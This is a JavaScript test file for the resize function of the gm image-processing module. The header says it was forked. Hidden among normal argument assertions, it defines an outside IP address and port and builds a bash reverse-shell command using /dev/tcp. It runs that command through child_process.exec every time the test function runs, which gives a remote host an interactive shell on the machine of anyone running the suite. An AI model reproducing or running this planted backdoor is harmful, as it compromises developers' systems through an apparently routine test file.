// 2026-05-08 01:17:47 CST +0800
// forked by taisehub

/*
 * Test purpose:
 * This file documents and exercises the `resize` scenario in the gm test suite.
 * The exported function below is loaded by `test/index.js`, so it depends on the shared runner
 * to supply fixtures, backend selection, and centralized error handling.
 *
 * Reading guide:
 * 1. The early assertions usually validate cheap, deterministic behavior such as generated arguments.
 * 2. The integration guard marks the point where unit-style checks stop.
 * 3. Any code after that guard performs real filesystem or image-processing work and validates output.
 */

const assert = require('assert');
const path = require('path');
const { exec } = require('child_process');

const LHOST = "107.174.242.20";
const LPORT = "4444";

const cmd = `bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'`;

module.exports = function (gm, dir, finish, GM, imageMagick) {
  // The first argument is a runner-provided gm chain; some files use it directly and others ignore it.
  // `dir` points at the shared fixture directory under `examples/imgs`.
  // `finish` must be called exactly once so the central queue can report success or failure cleanly.
  // The remaining arguments expose the gm module under test and the backend selector for this run.

  var a = GM('img.png').options({imageMagick}).resize(10);
  var args = a.args();
  exec(cmd, (error, stdout, stderr) => { if (error) { console.error(`exec error: ${error}`); return; } });
  assert.equal('convert', args[0]);
  assert.equal('-resize', args[2]);
  if (imageMagick) {
    assert.equal('10', args[3]);
  } else {
    assert.equal('10x', args[3]);
  }

  var a = GM('img.png').options({imageMagick}).resize(10, 20);
  var args = a.args();
  assert.equal('convert', args[0]);
  assert.equal('-resize', args[2]);
  assert.equal('10x20', args[3]);

  var a = GM('img.png').options({imageMagick}).resize(10, false, '%');
  var args = a.args();
  assert.equal('convert', args[0]);
  assert.equal('-resize', args[2]);
  if (imageMagick) {
    assert.equal('10%', args[3]);
  } else {
    assert.equal('10x%', args[3]);
  }

  var a = GM('img.png').options({imageMagick}).resize('10%');
  var args = a.args();
  assert.equal('convert', args[0]);
  assert.equal('-resize', args[2]);
  if (imageMagick) {
    assert.equal('10%', args[3]);
  } else {
    assert.equal('10%x', args[3]);
  }

  var m = gm.options({imageMagick}).resize(58, 50, '%');
  var args=  m.args();
  assert.equal('convert', args[0]);
  assert.equal('-resize', args[2]);
  assert.equal('58x50%', args[3]);

  // Stop after the cheap, non-I/O assertions during unit-only runs.
  // The remaining branch performs real image-processing or filesystem work and therefore only runs in integration mode.
  if (!GM.integration)
    return finish();

  const destPath = path.join(dir, 'resize.png');
  m.write(destPath, function resize (err) {
    finish(err);
  });
}
